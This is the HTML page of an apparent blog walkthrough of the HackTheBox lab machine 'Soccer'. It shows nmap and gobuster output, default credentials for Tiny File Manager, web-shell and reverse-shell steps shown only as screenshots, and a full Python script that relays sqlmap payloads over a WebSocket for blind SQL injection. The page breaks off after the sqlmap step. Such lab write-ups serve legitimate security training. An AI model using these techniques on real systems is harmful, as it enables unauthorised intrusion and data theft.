@@ -1,0 +1,772 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>HackTheBox - Soccer &middot; Congo</title>
+    <meta name="title" content="HackTheBox - Soccer &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        {% img /img/htb.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/soccer-htb/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/soccer-htb/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="HackTheBox - Soccer">
+  <meta property="og:description" content="{% img /img/htb.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2023-06-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-06-10T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="HackTheBox - Soccer">
+<meta name="twitter:description" content="{% img /img/htb.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "HackTheBox - Soccer",
+    "headline": "HackTheBox - Soccer",
+    
+    "abstract": "{% img \/img\/htb.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/soccer-htb\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-06-10T00:00:00\u002b00:00",
+    "datePublished": "2023-06-10T00:00:00\u002b00:00",
+    
+    "dateModified": "2023-06-10T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1851"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HackTheBox - Soccer
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2023-06-10 00:00:00 &#43;0000 UTC">10 June 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">9 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>{% img /img/htb.png %}</p>
+<p>Writeup for HackTheBox&rsquo;s Soccer.</p>
+<!-- more -->
+<p>Starting off with the <code>nmap</code> scan:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">#</span> <span class="nx">Nmap</span> <span class="mf">7.92</span> <span class="nx">scan</span> <span class="nx">initiated</span> <span class="nx">Tue</span> <span class="nx">Apr</span> <span class="mi">18</span> <span class="mi">16</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">39</span> <span class="mi">2023</span> <span class="nx">as</span><span class="o">:</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">sV</span> <span class="o">-</span><span class="nx">sC</span> <span class="o">-</span><span class="nx">A</span> <span class="o">-</span><span class="nx">Pn</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">22</span><span class="p">,</span><span class="mi">80</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">nmap_ports</span> <span class="o">-</span><span class="nx">vv</span> <span class="o">-</span><span class="nx">Pn</span> <span class="mf">10.10.11.194</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">10.10.11.194</span> <span class="p">(</span><span class="mf">10.10.11.194</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span><span class="p">,</span> <span class="nx">received</span> <span class="nx">user</span><span class="o">-</span><span class="nx">set</span> <span class="p">(</span><span class="mf">0.085</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Scanned</span> <span class="nx">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">18</span> <span class="mi">16</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">40</span> <span class="nx">UTC</span> <span class="k">for</span> <span class="mi">9</span><span class="nx">s</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">PORT</span>   <span class="nx">STATE</span> <span class="nx">SERVICE</span> <span class="nx">REASON</span>  <span class="nx">VERSION</span>
+</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">ssh</span>     <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">OpenSSH</span> <span class="mf">8.2</span><span class="nx">p1</span> <span class="nx">Ubuntu</span> <span class="mi">4</span><span class="nx">ubuntu0</span><span class="mf">.5</span> <span class="p">(</span><span class="nx">Ubuntu</span> <span class="nx">Linux</span><span class="p">;</span> <span class="nx">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">3072</span> <span class="nx">ad</span><span class="o">:</span><span class="mi">0</span><span class="nx">d</span><span class="o">:</span><span class="mi">84</span><span class="o">:</span><span class="nx">a3</span><span class="o">:</span><span class="nx">fd</span><span class="o">:</span><span class="nx">cc</span><span class="o">:</span><span class="mi">98</span><span class="o">:</span><span class="nx">a4</span><span class="o">:</span><span class="mi">78</span><span class="o">:</span><span class="nx">fe</span><span class="o">:</span><span class="nx">f9</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">15</span><span class="o">:</span><span class="nx">da</span><span class="o">:</span><span class="nx">e1</span><span class="o">:</span><span class="mi">6</span><span class="nx">d</span> <span class="p">(</span><span class="nx">RSA</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ssh</span><span class="o">-</span><span class="nx">rsa</span> <span class="nx">AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu</span><span class="o">/</span><span class="mi">2</span><span class="nx">AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG</span><span class="o">+</span><span class="mi">9</span><span class="nx">sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6</span><span class="o">+</span><span class="nx">N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj</span><span class="o">/</span><span class="nx">oOwQHXvp85a2hMqMmoqsljtS</span><span class="o">/</span><span class="nx">jO3tk7NUKA</span><span class="o">/</span><span class="mi">8</span><span class="nx">D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc</span><span class="o">/</span><span class="nx">MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0</span><span class="o">+</span><span class="nx">aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN</span><span class="o">/</span><span class="nx">AXoEZWl</span><span class="o">/</span><span class="nx">v1LWE5Qo1DEPrv7A6mIVZvWIM8</span><span class="o">/</span><span class="nx">AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">256</span> <span class="nx">df</span><span class="o">:</span><span class="nx">d6</span><span class="o">:</span><span class="nx">a3</span><span class="o">:</span><span class="mi">9</span><span class="nx">f</span><span class="o">:</span><span class="mi">68</span><span class="o">:</span><span class="mi">26</span><span class="o">:</span><span class="mi">9</span><span class="nx">d</span><span class="o">:</span><span class="nx">fc</span><span class="o">:</span><span class="mi">7</span><span class="nx">c</span><span class="o">:</span><span class="mi">6</span><span class="nx">a</span><span class="o">:</span><span class="mi">0</span><span class="nx">c</span><span class="o">:</span><span class="mi">29</span><span class="o">:</span><span class="nx">e9</span><span class="o">:</span><span class="mi">61</span><span class="o">:</span><span class="nx">f0</span><span class="o">:</span><span class="mi">0</span><span class="nx">c</span> <span class="p">(</span><span class="nx">ECDSA</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ecdsa</span><span class="o">-</span><span class="nx">sha2</span><span class="o">-</span><span class="nx">nistp256</span> <span class="nx">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD</span><span class="o">+</span><span class="nx">EqFcmc0ngWeRLfCr68</span><span class="o">+</span><span class="nx">uiuM59j9zrtLNRcLJSTJmlHUdcq25</span><span class="o">/</span><span class="nx">esgeZkyQ0mr2RZ5gozpBd5yzpdzk</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">256</span> <span class="mi">57</span><span class="o">:</span><span class="mi">97</span><span class="o">:</span><span class="mi">56</span><span class="o">:</span><span class="mi">5</span><span class="nx">d</span><span class="o">:</span><span class="nx">ef</span><span class="o">:</span><span class="mi">79</span><span class="o">:</span><span class="mi">3</span><span class="nx">c</span><span class="o">:</span><span class="mi">2</span><span class="nx">f</span><span class="o">:</span><span class="nx">cb</span><span class="o">:</span><span class="nx">db</span><span class="o">:</span><span class="mi">35</span><span class="o">:</span><span class="nx">ff</span><span class="o">:</span><span class="nx">f1</span><span class="o">:</span><span class="mi">7</span><span class="nx">c</span><span class="o">:</span><span class="mi">61</span><span class="o">:</span><span class="mi">5</span><span class="nx">c</span> <span class="p">(</span><span class="nx">ED25519</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_ssh</span><span class="o">-</span><span class="nx">ed25519</span> <span class="nx">AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u</span><span class="o">/</span><span class="nx">E8K49Gezm3jguM3d8VyAYsX0QyaN6H</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">http</span>    <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">nginx</span> <span class="mf">1.18.0</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="o">:</span> <span class="nx">Did</span> <span class="nx">not</span> <span class="nx">follow</span> <span class="nx">redirect</span> <span class="nx">to</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//soccer.htb/
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span> <span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="nx">Supported</span> <span class="nx">Methods</span><span class="o">:</span> <span class="nx">GET</span> <span class="nx">HEAD</span> <span class="nx">POST</span> <span class="nx">OPTIONS</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="o">:</span> <span class="nx">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Service</span> <span class="nx">Info</span><span class="o">:</span> <span class="nx">OS</span><span class="o">:</span> <span class="nx">Linux</span><span class="p">;</span> <span class="nx">CPE</span><span class="o">:</span> <span class="nx">cpe</span><span class="o">:</span><span class="err">/o:linux:linux_kernel</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">Read</span> <span class="nx">data</span> <span class="nx">files</span> <span class="nx">from</span><span class="o">:</span> <span class="err">/usr/bin/../share/nmap</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Service</span> <span class="nx">detection</span> <span class="nx">performed</span><span class="p">.</span> <span class="nx">Please</span> <span class="nx">report</span> <span class="nx">any</span> <span class="nx">incorrect</span> <span class="nx">results</span> <span class="nx">at</span> <span class="nx">https</span><span class="o">:</span><span class="c1">//nmap.org/submit/ .
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">#</span> <span class="nx">Nmap</span> <span class="nx">done</span> <span class="nx">at</span> <span class="nx">Tue</span> <span class="nx">Apr</span> <span class="mi">18</span> <span class="mi">16</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">49</span> <span class="mi">2023</span> <span class="o">--</span> <span class="mi">1</span> <span class="nx">IP</span> <span class="nx">address</span> <span class="p">(</span><span class="mi">1</span> <span class="nx">host</span> <span class="nx">up</span><span class="p">)</span> <span class="nx">scanned</span> <span class="k">in</span> <span class="mf">9.96</span> <span class="nx">seconds</span>
+</span></span></code></pre></div><p>We have port 80 and 22 open, <code>nmap</code> identified that the HTTP port is redirecting to the <code>soccer.htb</code> , performing a directory busting on it revealed an endpoint <code>/tiny</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">gobuster</span> <span class="nx">dir</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//soccer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Gobuster</span> <span class="nx">v3</span><span class="mf">.1.0</span>
+</span></span><span class="line"><span class="cl"><span class="nx">by</span> <span class="nx">OJ</span> <span class="nx">Reeves</span> <span class="p">(</span><span class="err">@</span><span class="nx">TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="nx">Christian</span> <span class="nx">Mehlmauer</span> <span class="p">(</span><span class="err">@</span><span class="nx">firefart</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Url</span><span class="o">:</span>                     <span class="nx">http</span><span class="o">:</span><span class="c1">//soccer.htb/
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Method</span><span class="o">:</span>                  <span class="nx">GET</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Threads</span><span class="o">:</span>                 <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Wordlist</span><span class="o">:</span>                <span class="err">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Negative</span> <span class="nx">Status</span> <span class="nx">codes</span><span class="o">:</span>   <span class="mi">404</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">User</span> <span class="nx">Agent</span><span class="o">:</span>              <span class="nx">gobuster</span><span class="o">/</span><span class="mf">3.1.0</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Timeout</span><span class="o">:</span>                 <span class="mi">10</span><span class="nx">s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">04</span><span class="o">/</span><span class="mi">18</span> <span class="mi">16</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mi">03</span> <span class="nx">Starting</span> <span class="nx">gobuster</span> <span class="k">in</span> <span class="nx">directory</span> <span class="nx">enumeration</span> <span class="nx">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="err">/tiny                 (Status: 301) [Size: 178] [--&gt; http://soccer.htb/tiny/]</span>
+</span></span></code></pre></div><p>It is a H3K File Manager, checking for any exploit for it revealed that we have PHP File Upload RCE:</p>
+<p><a href="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit" target="_blank" rel="noreferrer">https://github.com/febinrev/tinyfilemanager-2.4.3-exploit</a></p>
+<p>Exploitation requires an authenticated user, default credentials worked for the application:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">admin</span><span class="o">:</span><span class="nx">admin</span><span class="err">@</span><span class="mi">123</span>
+</span></span></code></pre></div><p>Once uploaded, we can go the <code>uploads</code> folder and then upload a web shell and execute commands from there:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Soccer_1b9739f8fee5449c921268c1b05aead0/Untitled.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Next, we can get a reverse shell from the web shell:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Soccer_1b9739f8fee5449c921268c1b05aead0/Untitled_1.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>The user did not have any privilege to read flags or anything, performing extensive enumeration did not reveal any credentials that could be used, checking for the running services, we had port 3000 and 9091, checking <code>/etc/hosts</code> , we can see that it has <code>soc-player.soccer.htb</code> vhost and checking the <code>nginx</code> configuration, it is the application running on port 3000.</p>
+<p>Next up, adding the <code>soc-player.soccer.htb</code> to the <code>hosts</code> file and then registering for the new user on the website, we can see that it has ticket checking functionality, the request is made over websocket and it has following data</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="o">:</span> <span class="s2">&#34;45352&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><p>Most probable attack in this case could be the SQL injection, but we cannot check it directly from burp. To tackle this, we can set up an upstream proxy and then use it for sending the payload to the websockert, following blog have a snippet which can be modified to be used:</p>
+<p><a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html" target="_blank" rel="noreferrer">https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html</a></p>
+<p>Modified script which will be hosting apython server at 8081 acting as an upstream proxy:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">from</span> <span class="nx">http</span><span class="p">.</span><span class="nx">server</span> <span class="kr">import</span> <span class="nx">SimpleHTTPRequestHandler</span>
+</span></span><span class="line"><span class="cl"><span class="nx">from</span> <span class="nx">socketserver</span> <span class="kr">import</span> <span class="nx">TCPServer</span>
+</span></span><span class="line"><span class="cl"><span class="nx">from</span> <span class="nx">urllib</span><span class="p">.</span><span class="nx">parse</span> <span class="kr">import</span> <span class="nx">unquote</span><span class="p">,</span> <span class="nx">urlparse</span>
+</span></span><span class="line"><span class="cl"><span class="nx">from</span> <span class="nx">websocket</span> <span class="kr">import</span> <span class="nx">create_connection</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">ws_server</span> <span class="o">=</span> <span class="s2">&#34;ws://soc-player.soccer.htb:9091&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">send_ws</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">ws</span> <span class="o">=</span> <span class="nx">create_connection</span><span class="p">(</span><span class="nx">ws_server</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="err">#</span> <span class="nx">If</span> <span class="nx">the</span> <span class="nx">server</span> <span class="nx">returns</span> <span class="nx">a</span> <span class="nx">response</span> <span class="nx">on</span> <span class="nx">connect</span><span class="p">,</span> <span class="nx">use</span> <span class="nx">below</span> <span class="nx">line</span>	
+</span></span><span class="line"><span class="cl">	<span class="err">#</span><span class="nx">resp</span> <span class="o">=</span> <span class="nx">ws</span><span class="p">.</span><span class="nx">recv</span><span class="p">()</span> <span class="err">#</span> <span class="nx">If</span> <span class="nx">server</span> <span class="nx">returns</span> <span class="nx">something</span> <span class="nx">like</span> <span class="nx">a</span> <span class="nx">token</span> <span class="nx">on</span> <span class="nx">connect</span> <span class="nx">you</span> <span class="nx">can</span> <span class="nx">find</span> <span class="nx">and</span> <span class="nx">extract</span> <span class="nx">from</span> <span class="nx">here</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="err">#</span> <span class="nx">For</span> <span class="nx">our</span> <span class="k">case</span><span class="p">,</span> <span class="nx">format</span> <span class="nx">the</span> <span class="nx">payload</span> <span class="k">in</span> <span class="nx">JSON</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">message</span> <span class="o">=</span> <span class="nx">unquote</span><span class="p">(</span><span class="nx">payload</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">)</span> <span class="err">#</span> <span class="nx">replacing</span> <span class="s2">&#34; with &#39; to avoid breaking JSON structure
+</span></span></span><span class="line"><span class="cl"><span class="s2">	data = &#39;{&#34;</span><span class="nx">id</span><span class="s2">&#34;:&#34;</span><span class="o">%</span><span class="nx">s</span><span class="s2">&#34;}&#39; % message
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">	ws.send(data)
+</span></span></span><span class="line"><span class="cl"><span class="s2">	resp = ws.recv()
+</span></span></span><span class="line"><span class="cl"><span class="s2">	ws.close()
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">	if resp:
+</span></span></span><span class="line"><span class="cl"><span class="s2">		return resp
+</span></span></span><span class="line"><span class="cl"><span class="s2">	else:
+</span></span></span><span class="line"><span class="cl"><span class="s2">		return &#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">def middleware_server(host_port,content_type=&#34;</span><span class="nx">text</span><span class="o">/</span><span class="nx">plain</span><span class="s2">&#34;):
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">	class CustomHandler(SimpleHTTPRequestHandler):
+</span></span></span><span class="line"><span class="cl"><span class="s2">		def do_GET(self) -&gt; None:
+</span></span></span><span class="line"><span class="cl"><span class="s2">			self.send_response(200)
+</span></span></span><span class="line"><span class="cl"><span class="s2">			try:
+</span></span></span><span class="line"><span class="cl"><span class="s2">				payload = urlparse(self.path).query.split(&#39;=&#39;,1)[1]
+</span></span></span><span class="line"><span class="cl"><span class="s2">			except IndexError:
+</span></span></span><span class="line"><span class="cl"><span class="s2">				payload = False
+</span></span></span><span class="line"><span class="cl"><span class="s2">				
+</span></span></span><span class="line"><span class="cl"><span class="s2">			if payload:
+</span></span></span><span class="line"><span class="cl"><span class="s2">				content = send_ws(payload)
+</span></span></span><span class="line"><span class="cl"><span class="s2">			else:
+</span></span></span><span class="line"><span class="cl"><span class="s2">				content = &#39;No parameters specified!&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">			self.send_header(&#34;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">type</span><span class="s2">&#34;, content_type)
+</span></span></span><span class="line"><span class="cl"><span class="s2">			self.end_headers()
+</span></span></span><span class="line"><span class="cl"><span class="s2">			self.wfile.write(content.encode())
+</span></span></span><span class="line"><span class="cl"><span class="s2">			return
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">	class _TCPServer(TCPServer):
+</span></span></span><span class="line"><span class="cl"><span class="s2">		allow_reuse_address = True
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">	httpd = _TCPServer(host_port, CustomHandler)
+</span></span></span><span class="line"><span class="cl"><span class="s2">	httpd.serve_forever()
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">print(&#34;</span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Starting</span> <span class="nx">MiddleWare</span> <span class="nx">Server</span><span class="s2">&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">print(&#34;</span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Send</span> <span class="nx">payloads</span> <span class="k">in</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//localhost:8081/?id=*&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">middleware_server</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span><span class="mi">8081</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nx">except</span> <span class="nx">KeyboardInterrupt</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">pass</span>
+</span></span></code></pre></div><p>Using <code>sqlmap</code> we can identify that there is a TIME based SQL Injection:</p>
+<p>
+
+
+
+
+
+
+  
+  
